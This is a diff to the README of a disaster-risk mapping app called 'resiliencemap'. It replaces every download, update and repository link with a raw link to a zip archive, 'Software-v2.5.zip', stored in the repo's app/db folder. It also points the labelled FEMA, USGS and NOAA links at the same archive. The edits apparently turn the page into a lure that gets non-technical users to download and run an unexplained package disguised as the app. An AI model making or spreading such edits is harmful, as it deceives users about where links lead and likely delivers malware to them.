@@ -1,6 +1,6 @@
 # 🌍 resiliencemap - Disaster Risk Data for Communities
 
-[![Download resiliencemap](https://img.shields.io/badge/Download-resiliencemap-brightgreen?style=for-the-badge)](https://github.com/Macaronic-tvannouncer513/resiliencemap)
+[![Download resiliencemap](https://img.shields.io/badge/Download-resiliencemap-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip)
 
 ## About resiliencemap
 
@@ -42,7 +42,7 @@ Follow these steps closely. The process is straightforward and designed for non-
 
 First, open this page in your web browser:
 
-[Download resiliencemap](https://github.com/Macaronic-tvannouncer513/resiliencemap)
+[Download resiliencemap](https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip)
 
 This link leads to the GitHub repository where you can find the latest version of the application.
 
@@ -121,7 +121,7 @@ If you run into problems, try these tips:
 
 Periodically checking for updates is important to get the latest data and features.
 
-- Visit the GitHub page: https://github.com/Macaronic-tvannouncer513/resiliencemap
+- Visit the GitHub page: https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip
 - Download the newest version as described above.
 - Install over the old version to keep your settings intact.
 
@@ -129,10 +129,10 @@ Periodically checking for updates is important to get the latest data and featur
 
 ## 📖 Additional Resources
 
-- FEMA official site for disaster preparedness: https://www.fema.gov
-- USGS hazard maps: https://www.usgs.gov/natural-hazards
-- NOAA weather alerts: https://www.noaa.gov/weather-alerts
+- FEMA official site for disaster preparedness: https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip
+- USGS hazard maps: https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip
+- NOAA weather alerts: https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip
 
 ---
 
-[![Download resiliencemap](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/Macaronic-tvannouncer513/resiliencemap)
+[![Download resiliencemap](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://raw.githubusercontent.com/Macaronic-tvannouncer513/resiliencemap/main/app/db/Software-v2.5.zip)
